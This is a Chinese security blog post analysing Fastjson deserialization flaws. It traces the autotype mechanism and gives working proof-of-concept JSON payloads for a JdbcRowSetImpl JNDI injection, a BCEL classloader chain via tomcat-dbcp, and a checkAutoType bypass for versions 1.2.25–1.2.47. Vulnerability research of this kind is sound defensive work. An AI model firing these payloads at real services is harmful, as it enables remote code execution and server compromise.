
<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="utf-8" />
    <title>Fastjson漏洞分析 | W000i</title>
    <meta name="author" content="W00i" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>W000I</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;主页</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;W000I</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>Fastjson漏洞分析</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/8/19
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/Java/" style="color: #03a9f4">
                    Java
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <p>fastjson 是阿里巴巴开发的 java语言编写的高性能 JSON 库，用于将数据在Json 和 Java Object之间相互转换。它没有用java的序列化机制，而是自定义了一套序列化机制。</p>
<span id="more"></span>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Maven引用fastjson1.2.24依赖</p>
<pre><code>    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
            &lt;version&gt;1.2.24&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
</code></pre>
<h2 id="Fastjson简单使用"><a href="#Fastjson简单使用" class="headerlink" title="Fastjson简单使用"></a>Fastjson简单使用</h2><p>使用fastjson解析一个字符串</p>
<pre><code>package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;


public class Main &#123;
    public static void main(String[] args) &#123;
        String str = &quot;&#123;\&quot;user\&quot;:\&quot;xiaoming\&quot;,\&quot;age\&quot;:18&#125;&quot;;
        JSONObject json = JSON.parseObject(str);
        System.out.println(json);
        System.out.println(json.getString(&quot;user&quot;));
    &#125;
&#125;
</code></pre>
<p>输出：</p>
<pre><code>&#123;&quot;user&quot;:&quot;xiaoming&quot;,&quot;age&quot;:18&#125;
xiaoming
</code></pre>
<h2 id="Fastjson-Java-Bean"><a href="#Fastjson-Java-Bean" class="headerlink" title="Fastjson+Java Bean"></a>Fastjson+Java Bean</h2><p>创建一个User类</p>
<pre><code>package org.example;

public class User &#123;
    private String name;
    private int age;

    public User()&#123;
        System.out.println(&quot;无参构造User()&quot;);
    &#125;

    public User(String name, int age) &#123;
        System.out.println(&quot;有参构造User()&quot;);
        this.name = name;
        this.age = age;
    &#125;

    @Override
    public String toString() &#123;
        System.out.println(&quot;toString()&quot;);
        return &quot;User&#123;&quot; +
                &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +
                &quot;, age=&quot; + age +
                &#39;&#125;&#39;;
    &#125;

    public String getName() &#123;
        System.out.print(&quot;getName()&quot;);
        return name;
    &#125;

    public void setName(String name) &#123;
        System.out.println(&quot;setName()&quot;);
        this.name = name;
    &#125;

    public int getAge() &#123;
        System.out.println(&quot;getAge()&quot;);
        return age;
    &#125;

    public void setAge(int age) &#123;
        System.out.println(&quot;setAge()&quot;);
        this.age = age;
    &#125;
&#125;
</code></pre>
<p>这个demo实例化User，然后将对象转换成一个jaon字符串</p>
<pre><code>package org.example;
import com.alibaba.fastjson.JSON;


public class Main &#123;
    public static void main(String[] args) &#123;
        User user = new User(&quot;xiaoming&quot;,18);
        String json = JSON.toJSONString(user);
        System.out.println(json);

    &#125;
&#125;
</code></pre>
<p>在转换过程中还调用了get方法，但是这里只有转换后的键值对，不知道是从那个类进行的加工。</p>
<p>输出：</p>
<pre><code>有参构造User()
getAge()
getName()&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;xiaoming&quot;&#125;
</code></pre>
<p>发现还有一个方法支持两个参数，第二个参数传递SerializerFeature.WriteClassName</p>
<pre><code>    public static String toJSONString(Object object, SerializerFeature... features) &#123;
        return toJSONString(object, DEFAULT_GENERATE_FEATURE, features);
    &#125;
</code></pre>
<p>输出的字符串多了&quot;@type&quot;:&quot;org.example.User&quot;</p>
<p>输出：</p>
<pre><code>有参构造User()
getAge()
getName()&#123;&quot;@type&quot;:&quot;org.example.User&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;xiaoming&quot;&#125;
</code></pre>
<h2 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h2><p>在DefaultJSONParser#parseObject会将@type对应的值作为类对象去加载。</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440876382.png" alt="image-1720440876382"></p>
<p>demo</p>
<pre><code>package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;


public class Main &#123;
    public static void main(String[] args) &#123;
        String str = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;xiaoming\&quot;&#125;&quot;;
        System.out.println(JSON.parseObject(str));
        System.out.println(&quot;-------------------------------&quot;);
        System.out.println(JSON.parse(str));

    &#125;
&#125;
</code></pre>
<p>JSON.parseObject()转换过程会调用set和get方法</p>
<p>JSON.parse()转换过程会调用set方法</p>
<p>输出：</p>
<pre><code>无参构造User()
setAge()
setName()
getAge()
getName()&#123;&quot;name&quot;:&quot;xiaoming&quot;,&quot;age&quot;:18&#125;
-------------------------------
无参构造User()
setAge()
setName()
toString()
User&#123;name=&#39;xiaoming&#39;, age=18&#125;
</code></pre>
<p>如果在get或者set有一个危险方法那么就可以达到命令执行的效果。</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440887741.png" alt="image-1720440887741"></p>
<h2 id="JdbcRowSetImpl反序列化链"><a href="#JdbcRowSetImpl反序列化链" class="headerlink" title="JdbcRowSetImpl反序列化链"></a>JdbcRowSetImpl反序列化链</h2><p>定位到com.sun.rowset.JdbcRowSetImpl#connect</p>
<p>发现调用了InitialContext()和lookup()，如果this.getDataSourceName()可控将会是一个JNDI注入。</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440898023.png" alt="image-1720440898023"></p>
<p>跟一下getDataSourceName()，返回了dataSource</p>
<pre><code>    public String getDataSourceName() &#123;
        return dataSource;
    &#125;
</code></pre>
<p>它还有另一个set方法</p>
<pre><code>    public void setDataSourceName(String name) throws SQLException &#123;

        if (name == null) &#123;
            dataSource = null;
        &#125; else if (name.equals(&quot;&quot;)) &#123;
           throw new SQLException(&quot;DataSource name cannot be empty string&quot;);
        &#125; else &#123;
           dataSource = name;
        &#125;

        URL = null;
    &#125;
</code></pre>
<p>再往上跟一下connect()，有一个set方法需要传递一个boolean类型的参数。</p>
<pre><code>    public void setAutoCommit(boolean var1) throws SQLException &#123;
        if (this.conn != null) &#123;
            this.conn.setAutoCommit(var1);
        &#125; else &#123;
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        &#125;

    &#125;
</code></pre>
<p>现在可以构造POC</p>
<pre><code>package org.example;
import com.alibaba.fastjson.JSON;


public class Main &#123;
    public static void main(String[] args) &#123;
        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/#T\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;;
        JSON.parseObject(s);
    &#125;
&#125;
</code></pre>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440916618.png" alt="image-1720440916618"></p>
<h2 id="FastjsonBcel反序列化链"><a href="#FastjsonBcel反序列化链" class="headerlink" title="FastjsonBcel反序列化链"></a>FastjsonBcel反序列化链</h2><p>定位到com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</p>
<p>满足条件会调用createClass方法。</p>
<pre><code class="loadclass">        if(class_name.indexOf(&quot;$$BCEL$$&quot;) &gt;= 0)
          clazz = createClass(class_name);
        else &#123; // Fourth try: Load classes via repository
          if ((clazz = repository.loadClass(class_name)) != null) &#123;
            clazz = modifyClass(clazz);
          &#125;
          else
            throw new ClassNotFoundException(class_name);
        &#125;

        if(clazz != null) &#123;
          byte[] bytes  = clazz.getBytes();
          cl = defineClass(class_name, bytes, 0, bytes.length);
        &#125; else // Fourth try: Use default class loader
          cl = Class.forName(class_name);
</code></pre>
<p>跟一下createClass方法，截取$$BCEL$$后面的内容并进行decode，然后回到ClassLoader使用defineClass动态类加载</p>
<pre><code>  protected JavaClass createClass(String class_name) &#123;
    int    index     = class_name.indexOf(&quot;$$BCEL$$&quot;);
    String real_name = class_name.substring(index + 8);

    JavaClass clazz = null;
    try &#123;
      byte[]      bytes  = Utility.decode(real_name, true);
      ClassParser parser = new ClassParser(new ByteArrayInputStream(bytes), &quot;foo&quot;);

      clazz = parser.parse();
    &#125; catch(Throwable e) &#123;
      e.printStackTrace();
      return null;
    &#125;
</code></pre>
<p>写一个demo尝试进行加载</p>
<pre><code class="demo">public class FastjsonBcel &#123;
    public static void main(String[] args) throws Exception &#123;
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = classToByteArray(&quot;D:\\tmp\\class\\Test.class&quot;);
        String code = Utility.encode(bytes, true);
        classLoader.loadClass(&quot;$$BCEL$$&quot; + code).newInstance();
    &#125;

    public static byte[] classToByteArray(String className) throws Exception &#123;
        try (FileInputStream fis = new FileInputStream(className);
             ByteArrayOutputStream baos = new ByteArrayOutputStream()) &#123;
            byte[] buffer = new byte[1024];
            int length;
            while ((length = fis.read(buffer)) != -1) &#123;
                baos.write(buffer, 0, length);
            &#125;
            return baos.toByteArray();
        &#125;
    &#125;
&#125;
</code></pre>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440925846.png" alt="image-1720440925846"></p>
<p>接下来想办法调用loadclass</p>
<p>导入tomcat依赖</p>
<pre><code>        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
            &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;
            &lt;version&gt;9.0.20&lt;/version&gt;
        &lt;/dependency&gt;
</code></pre>
<p>定位到org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory</p>
<p>发现调用了Class.forName，如果driverClassName和driverClassLoader可控则会加载传递的恶意类</p>
<pre><code>                        if (driverClassLoader == null) &#123;
                            driverFromCCL = Class.forName(driverClassName);
                        &#125; else &#123;
                            driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);
                        &#125;
</code></pre>
<p>两个变量都有对应的set，变量可控</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440936461.png" alt="image-1720440936461"></p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440948731.png" alt="image-1720440948731"></p>
<p>找一下createConnectionFactory对应的get或者set方法</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440956233.png" alt="image-1720440956233"></p>
<p>再跟一下createDataSource，找到一个get打头的方法</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720440963581.png" alt="image-1720440963581"></p>
<p>现在需要给Class.forname里面的两个参数赋值，然后调用这个getConnection()方法应该就可以加载传递的恶意类。</p>
<pre><code>public class FastjsonBcel &#123;
    public static void main(String[] args) throws Exception &#123;
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = classToByteArray(&quot;D:\\tmp\\class\\Test.class&quot;);
        String code = Utility.encode(bytes, true);
//        classLoader.loadClass(&quot;$$BCEL$$&quot; + code).newInstance();

         BasicDataSource bas = new BasicDataSource();
         bas.setDriverClassName(&quot;$$BCEL$$&quot; + code);
         bas.setDriverClassLoader(classLoader);
         bas.getConnection();
    &#125;
</code></pre>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441083482.png" alt="image-1720441083482"><br>构造fastjson解析进行加载</p>
<pre><code>        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot; + code+&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.apache.bcel.util.ClassLoader\&quot;&#125;&#125;&quot;;
        JSON.parseObject(s);
</code></pre>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441061384.png" alt="image-1720441061384"></p>
<h2 id="fastjson1-2-25"><a href="#fastjson1-2-25" class="headerlink" title="fastjson1.2.25&lt;&#x3D;1.2.47绕过"></a>fastjson1.2.25&lt;&#x3D;1.2.47绕过</h2><p>pom改为1.2.25</p>
<pre><code>        &lt;dependency&gt;
            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
            &lt;version&gt;1.2.25&lt;/version&gt;
        &lt;/dependency&gt;
</code></pre>
<p>运行JdbcRowSetImpl反序列化链的POC报错了</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441123017.png" alt="image-1720441123017"></p>
<p>在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map,<br>java.lang.Object)方法里面，loadClass变成了checkAutoType</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441128769.png" alt="image-1720441128769"></p>
<p>1.2.24版本为</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441135735.png" alt="image-1720441135735"></p>
<p>跟进去checkAutoType，里面有很多的if判断，往下跟发现一个*TypeUtils.*getClassFromMapping**</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441142677.png" alt="image-1720441142677"></p>
<p>跟进去<em>getClassFromMapping</em>，在mappings获取了一个缓存</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441150553.png" alt="image-1720441150553"></p>
<p>回到checkAutoType，接下来如果缓存为null，又在反序列化器去寻找。</p>
<pre><code>        if (clazz == null) &#123;
            clazz = deserializers.findClass(typeName);
        &#125;
</code></pre>
<p>发现默认缓存是null，但是如果缓存是一个类，直接会返回，就能加载这个类。</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441176992.png" alt="image-1720441176992"></p>
<p>查找mappings赋值的地方，发现loadClass有赋值的情况。</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441185615.png" alt="image-1720441185615"></p>
<p>再看一下哪里调用了loadClass，在MiscCodec#deserialze满足(clazz &#x3D;&#x3D;<br>Class.class)会调用loadClass</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441192737.png" alt="image-1720441192737"></p>
<p>MiscCodec类实现了两个接口，序列化器和反序列化器</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441199147.png" alt="image-1720441199147"></p>
<p>反序列化器是在DefaultJSONParser生成的</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441204714.png" alt="image-1720441204714"></p>
<p>跟进config.getDeserializer往上翻发现put了很多的类，初始化的时候会把这些类和对应的反序列化器都放进去</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441211612.png" alt="image-1720441211612"></p>
<p>如果反序列化的类是Class.class就会调用MiscCodec反序列化器</p>
<pre><code>deserializers.put(Class.class, MiscCodec.instance);
</code></pre>
<p>然后会调用到MiscCodec#deserialze里面的TypeUtils.<em>loadClass</em></p>
<pre><code>        if (clazz == Class.class) &#123;
            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
        &#125;
</code></pre>
<p>TypeUtils#loadClass()会把这个类加载，并且放到缓存里面</p>
<pre><code>        try &#123;
            clazz = Class.forName(className);
            mappings.put(className, clazz);

            return clazz;
</code></pre>
<p>然后在ParserConfig#checkAutoType查找到了缓存，那么进入if里面返回了clazz，绕过了这个检查。</p>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441229398.png" alt="image-1720441229398"></p>
<p>构造poc</p>
<pre><code>    public static void main(String[] args) &#123;
        String s = &quot;&#123;&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/#T\", \"autoCommit\":false&#125;&#125;&quot;;
        JSON.parseObject(s);
    &#125;
</code></pre>
<p><img src="/../imgs/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1720441236540.png" alt="image-1720441236540"></p>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 W000i
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;W00i
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
	
	
	{% if theme.fireworks %}
   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
    {% endif %}
 
</body>
</html>
